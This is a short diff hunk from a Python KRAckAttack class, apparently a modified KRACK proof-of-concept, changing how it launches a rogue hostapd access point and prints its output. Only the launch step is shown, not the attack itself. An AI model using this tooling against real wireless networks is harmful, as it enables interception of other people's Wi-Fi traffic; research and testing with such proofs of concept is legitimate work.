@@ -934,8 +934,8 @@ class KRAckAttack():
 		p = subprocess.Popen(["echo", "Welcome"], stdout=subprocess.PIPE)
 		print (p.communicate()[0])
 
-		self.hostapd = subprocess.Popen(["/root/krackattacks-poc-zerokey/hostapd/hostapd", "/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		print (self.hostapd.communicate()[0])
+		self.hostapd = subprocess.Popen(["hostapd", "/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		print (self.hostapd.stdout)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
